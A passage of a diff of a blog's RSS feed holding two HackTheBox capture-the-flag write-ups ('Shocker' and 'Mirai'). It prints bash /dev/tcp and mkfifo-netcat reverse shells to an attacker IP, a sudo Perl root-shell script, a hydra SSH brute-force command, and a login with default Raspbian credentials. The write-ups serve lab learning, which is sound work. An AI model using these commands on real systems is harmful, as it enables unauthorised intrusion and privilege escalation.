-pi@raspberrypi:~ $ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;Finally!&lt;/p&gt;
 
-&lt;p&gt;Great! I was in!&lt;/p&gt;
+&lt;h2 id=&quot;getting-a-decent-shell&quot;&gt;Getting a decent shell&lt;/h2&gt;
+&lt;p&gt;Before going for the flags, I wanted a better shell. And so I got one.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ ls
-background.jpg  Documents  list.dir  oldconffiles  Public        root.dir   root.txt   Videos
-Desktop         Downloads  l.dir  Music     Pictures      python_games  root.list  Templates&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;Seeing &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; made me &lt;code class=&quot;highlighter-rouge&quot;&gt;cat root.txt&lt;/code&gt; but it was empty. It was probably left behind by other people as other files on the same directory.&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1234
+listening on [any] 1234 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;h3 id=&quot;getting-the-user-flag&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; flag&lt;/h3&gt;
-&lt;p&gt;Getting the user flag was pretty straightforward:&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ find . -name 'user.txt'
-./Desktop/user.txt
-find: `./Desktop/lost+found': Permission denied
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.101/1234 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-pi@raspberrypi:~ $ cat ./Desktop/user.txt
-ff837707441b257a20e32199d7c8838d&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;Then I got a shell!&lt;/p&gt;
 
-&lt;p&gt;One down. Let’s root it now!&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 48700
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;h3 id=&quot;getting-the-root-flag&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag&lt;/h3&gt;
-&lt;p&gt;Another thing that Raspbian has is being able to &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; without a password.&lt;/p&gt;
+&lt;p&gt;But ….. this shell was echoing every key typed. I needed a better shell.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ sudo su
-root@raspberrypi:/home/pi#
-root@raspberrypi:/home/pi# cd ~
-root@raspberrypi:~# pwd
-/root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;As I &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt;‘ed on /root I saw:&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1235
+listening on [any] 1235 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# ls
-recovered files  root.txt
-root@raspberrypi:~# cat root.txt 
-I lost my original root.txt! I think I may have a backup on my USB stick...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;It was almost a ‘not so fast, young man’. That engaged me more on the challenge.&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc LISTENING-IP LISTENING-PORT &amp;gt; /tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;To find the mounted partitions, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;df -h&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# df -h
-Filesystem      Size  Used Avail Use% Mounted on
-aufs            8.5G  2.8G  5.3G  35% /
-tmpfs           101M   13M   88M  13% /run
-/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
-/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
-tmpfs           251M     0  251M   0% /lib/live/mount/overlay
-/dev/sda2       8.5G  2.8G  5.3G  35% /lib/live/mount/persistence/sda2
-devtmpfs         10M     0   10M   0% /dev
-tmpfs           251M  8.0K  251M   1% /dev/shm
-tmpfs           5.0M  4.0K  5.0M   1% /run/lock
-tmpfs           251M     0  251M   0% /sys/fs/cgroup
-tmpfs           251M  8.0K  251M   1% /tmp
-/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
-tmpfs            51M     0   51M   0% /run/user/999
-tmpfs            51M     0   51M   0% /run/user/1000&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1235
+listening on [any] 1235 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 35756
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;There you are.&lt;/p&gt;
+&lt;p&gt;Now the shell was decent. Flags, here I come!&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# cd /media/usbstick
-root@raspberrypi:/media/usbstick# ls
-damnit.txt  lost+found
-root@raspberrypi:/media/usbstick# cat damnit.txt 
-Damnit! Sorry man I accidentally deleted your files off the USB stick.
-Do you know if there is any way to get them back?
+&lt;h2 id=&quot;getting-the-user-flag-it-was-boring&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; flag (it was boring)&lt;/h2&gt;
+&lt;p&gt;To score the first points, I had to find the &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; file, where the flag was. I took the directly approach:&lt;/p&gt;
 
--James&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
+2ec24e11320026d1e70ff3e16695b233&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Damn it, James! &lt;code class=&quot;highlighter-rouge&quot;&gt;lost+found&lt;/code&gt; had nothing. Well, maybe James tried to recover the file. Let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;history&lt;/code&gt; (only the relevant info is shown).&lt;/p&gt;
+&lt;p&gt;That was very easy. Let’s step up the game.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:/media/usbstick/lost+found# history
-   39  extundelete 
-   58  cd .local/
-   60  cd share/
-   62  cd Trash/
-   64  cd files/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;h2 id=&quot;getting-the-root-flag-it-was-cool&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag (it was cool)&lt;/h2&gt;
+&lt;p&gt;As my first try, ran the obvious &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; but it didn’t work because the user’s password was unknown.&lt;/p&gt;
 
-&lt;p&gt;I &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt;‘ed &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/pi/.local/share/Trash/files&lt;/code&gt; but there was nothing relevant. Let’s try this &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; command.&lt;/p&gt;
+&lt;h3 id=&quot;linenum&quot;&gt;LinEnum&lt;/h3&gt;
+&lt;p&gt;So, there is this awesome enumeration script called &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; (that can be found &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;here&lt;/a&gt;). Since the box couldn’t communicate with the outer-world, I had to upload it from my machine and I chose &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to do that.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:/media/usbstick/lost+found# extundelete -h
-bash: extundelete: command not found&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;I naïvely tried installing it via &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt;. The box couldn’t communicate with the outer-world.&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233 &amp;lt; LinEnum.sh 
+listening on [any] 1233 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;I searched about &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; and found it’s sourceforce page, where I spent a few minutes learning about it. That’s when I saw:&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Typically, you would replace &quot;partition&quot; in the above examples by a device name like &quot;sda4&quot; or &quot;hdb7&quot;. When either of those commands successfully completes, you can now take the next steps leisurely - you will no longer make anything worse by waiting. If you would like to make a backup of your partition, you may do so by a command such as:
-$ dd bs=4M if=/dev/partition of=partition.backup&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/usr/lib/cgi-bin$ cd /tmp
+shelly@Shocker:/tmp$ nc 10.10.15.101 1233 &amp;gt; enum.sh
+shelly@Shocker:/tmp$ sh enum.sh -t -r shocker&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;It made a lot of sense. If I could make a backup of the usb stick and download it, I could mount the backup it on my machine and run &lt;code class=&quot;highlighter-rouge&quot;&gt;extundelete&lt;/code&gt; locally, since it was only 8MB (check &lt;code class=&quot;highlighter-rouge&quot;&gt;df -h&lt;/code&gt; output) and it could be downloaded easily. And so I proceeded. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;dd if=/dev/sdb of=usb_backup bs=1M&lt;/code&gt; and downloaded it via &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt;.&lt;br /&gt;
-Before searching the proper way to mount a file as a directory, why not run &lt;code class=&quot;highlighter-rouge&quot;&gt;strings usb_backup&lt;/code&gt;?&lt;/p&gt;
+&lt;p&gt;The produced report was named &lt;code class=&quot;highlighter-rouge&quot;&gt;shocker-04-02-18&lt;/code&gt; and I downloaded it via &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; (that I’ll suppress).&lt;br /&gt;
+Upon reading the report, I saw that &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/perl&lt;/code&gt; could be ran as &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;. At this point, I noticed that I was very close. I could just write a script to print the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag but that would be pretty boring, right? I’d rather get a &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; shell just for fun! And so I came up with this simple script:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# strings usb_backup
-&amp;gt;r &amp;amp;
-/media/usbstick
-lost+found
-root.txt
-damnit.txt
-&amp;gt;r &amp;amp;
-&amp;gt;r &amp;amp;
-/media/usbstick
-lost+found
-root.txt
-damnit.txt
-&amp;gt;r &amp;amp;
-/media/usbstick
-2]8^
-lost+found
-root.txt
-damnit.txt
-&amp;gt;r &amp;amp;
-3d3e483143ff12ec505d026fa13e020b
-Damnit! Sorry man I accidentally deleted your files off the USB stick.
-Do you know if there is any way to get them back?
--James&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;root.pl&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;There you are, &lt;em&gt;root hash&lt;/em&gt;!&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;#!/bin/perl
+system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.15.101 1233 &amp;gt;/tmp/f&quot;);&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;h2 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h2&gt;
-&lt;p&gt;I was my first CTF machine, so some actions were naïve and I overthought a lot, that made me miss some kind of obvious stuff at first glance. It felt very good to start with an IP and work my way in using some knowledge I previously had, get a shell on the machine and finally some out-of-the-box thinking to find the root hash. If it wasn’t for the previously knowledge about the default credentials of Raspbian, it’d have taken a LOT of time to get in. . It motivated me more to keep working on these machines, gaining knowledge and having fun (and sometimes wanting to hit my head on the wall :)&lt;/p&gt;
+&lt;p&gt;And proceeded to get the desired shell:&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233
+listening on [any] 1233 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/tmp$ sudo /usr/bin/perl root.pl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And finally I was (g)&lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233
+listening on [any] 1233 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 40344
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Alright, the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag …&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# cat /root/root.txt
+52c2715605d70c7619030560dc1ca467&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;It was hard for me to find the entry point, but after that, it was pretty simple. I noticed that sometimes I overcomplicate stuff e.g. I think I could have just set up a perl script with &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;bash&quot;)&lt;/code&gt; and get &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; in the fraction of the time, but I only thought about that hours after. I feel that I lack some enumeration skills and mindset, but that is the purpose of me working on these boxes.&lt;/p&gt;
+
+&lt;p&gt;exit(0);&lt;/p&gt;
 </description>
 				<pubDate>Sat, 03 Feb 2018 22:00:01 -0200</pubDate>
 				<link>/2018/02/htb-ctf-shocker</link>
 				<guid isPermaLink="true">/2018/02/htb-ctf-shocker</guid>
-			</item>
-		
-			<item>
-				<title>HackTheBox - Hacking Mirai</title>
-				<description>&lt;h3 id=&quot;disclaimer&quot;&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt;&lt;/h3&gt;
-&lt;p&gt;As by the ToS of HackTheBox, solutions cannot be posted before the machine is retired, so you won’t be able to use this post as your way into the described machine, since it’ll already be out-of-service.&lt;/p&gt;
-
-&lt;h1 id=&quot;preface&quot;&gt;Preface&lt;/h1&gt;
-&lt;p&gt;HackTheBox was the first CTF site that I signed up and actually got my hands dirty. The experience is being awesome. If you want somewhere to practice, gather more knowledge, or have some fun, give it a try: https://www.hackthebox.eu/invite&lt;br /&gt;
-&lt;strong&gt;Reminder:&lt;/strong&gt; You have to hack your way in to the registration process. It is worth.&lt;/p&gt;
-
-&lt;h1 id=&quot;lets-begin&quot;&gt;Let’s begin&lt;/h1&gt;
-&lt;p&gt;As my first CTF machine, I’ve chosen Mirai due the difficulty ratings on the list of available machines: Mirai was the lowest hanging fruit. It’s IP was &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.48&lt;/code&gt;. Let the games begin!&lt;/p&gt;
-
-&lt;h2 id=&quot;enumerating&quot;&gt;Enumerating&lt;/h2&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -sS -A -T5 10.10.10.48
-
-Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-02 23:24 -02
-Nmap scan report for 10.10.10.48
-Host is up (0.26s latency).
-Not shown: 997 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
-|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
-|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
-|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
-53/tcp open  domain  dnsmasq 2.76
-| dns-nsid: 
-|_  bind.version: dnsmasq-2.76
-80/tcp open  http    lighttpd 1.4.35
-|_http-server-header: lighttpd/1.4.35
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 1025/tcp)
-HOP RTT       ADDRESS
-1   259.10 ms 10.10.14.1
-2   258.63 ms 10.10.10.48
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 34.05 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;That’s good. We have a SSH and HTTP service to work on. I’d have started brute-forcing on SSH immediately if I knew any users, so I put it aside for the moment.&lt;/p&gt;
-
-&lt;h3 id=&quot;http-server&quot;&gt;HTTP server&lt;/h3&gt;
-&lt;p&gt;Accessing http://10.10.10.48 returned an empty page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/mirai/empty-http.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;Empty page on http://10.10.10.48&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing to work with. So I fired up &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; again with some native scripts to see if any of them returned stuff I could further explore. The interesting results are below.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# Nmap 7.60 scan initiated Fri Feb  2 23:29:50 2018 as: nmap -O -A -sS --script=default,vuln -T5 -o nmap-out2.txt 10.10.10.48
-Nmap scan report for 10.10.10.48
-Host is up (0.25s latency).
-Not shown: 997 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
-|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
-|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
-|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
-53/tcp open  domain  dnsmasq 2.76
-| dns-nsid: 
-|_  bind.version: dnsmasq-2.76
-80/tcp open  http    lighttpd 1.4.35
-| http-cookie-flags: 
-|   /admin/: 
-|     PHPSESSID: 
-|       httponly flag not set
-|   /admin/index.php: 
-|     PHPSESSID: 
-|_      httponly flag not set
-
-... info removed ...
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri Feb  2 23:32:04 2018 -- 1 IP address (1 host up) scanned in 133.64 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we know about the existence of &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/index.php&lt;/code&gt; (that end up both returning the same page).&lt;br /&gt;
-&lt;img src=&quot;/assets/images/mirai/pi-hole.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;Pi-hole page at http://10.10.10.48/admin&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;While searching about Pi-hole, I found it’s github repository. From there, I started looking for possible users that might be used on the Mirai machine, ending up discovering &lt;code class=&quot;highlighter-rouge&quot;&gt;pihole&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Since it was the easiest machine at the time, I assumed that it would be enough to proceed.&lt;/p&gt;
-
-&lt;h3 id=&quot;release-the-hydra&quot;&gt;Release the &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;&lt;/h3&gt;
-&lt;p&gt;I went forward and fired up &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;hydra -l pihole -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.48 -t 20 -V&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; is fairly large, so after some minutes I thought I could go have dinner while &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt; did it’s thing, not putting so much faith on the outcome, honestly.&lt;/p&gt;
-
-&lt;p&gt;With refreshed mind, I came back and noticed that I’d forgotten to add &lt;code class=&quot;highlighter-rouge&quot;&gt;-e nsr&lt;/code&gt;, so I went ahead and tested some combinations manually aswell. The followed combinations resulted in nothing.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pihole:pihole
-pihole:elohip
-pihole:pi&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Suddenly, I had the epiphany. Damn, it might be a Raspberry Pi which had the default credentials &lt;code class=&quot;highlighter-rouge&quot;&gt;pi:raspberry&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh pi@10.10.10.48
-pi@10.10.10.48's password: 
-
-pi@raspberrypi:~ $ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great! I was in!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ ls
-background.jpg  Documents  list.dir  oldconffiles  Public        root.dir   root.txt   Videos
-Desktop         Downloads  l.dir  Music     Pictures      python_games  root.list  Templates&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Seeing &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; made me &lt;code class=&quot;highlighter-rouge&quot;&gt;cat root.txt&lt;/code&gt; but it was empty. It was probably left behind by other people as other files on the same directory.&lt;/p&gt;
-
-&lt;h3 id=&quot;getting-the-user-flag&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; flag&lt;/h3&gt;
-&lt;p&gt;Getting the user flag was pretty straightforward:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ find . -name 'user.txt'
-./Desktop/user.txt
-find: `./Desktop/lost+found': Permission denied
-
-pi@raspberrypi:~ $ cat ./Desktop/user.txt
-ff837707441b257a20e32199d7c8838d&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;One down. Let’s root it now!&lt;/p&gt;
-
-&lt;h3 id=&quot;getting-the-root-flag&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag&lt;/h3&gt;
-&lt;p&gt;Another thing that Raspbian has is being able to &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; without a password.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pi@raspberrypi:~ $ sudo su
-root@raspberrypi:/home/pi#
-root@raspberrypi:/home/pi# cd ~
-root@raspberrypi:~# pwd
-/root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As I &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt;‘ed on /root I saw:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@raspberrypi:~# ls
-recovered files  root.txt
-root@raspberrypi:~# cat root.txt 
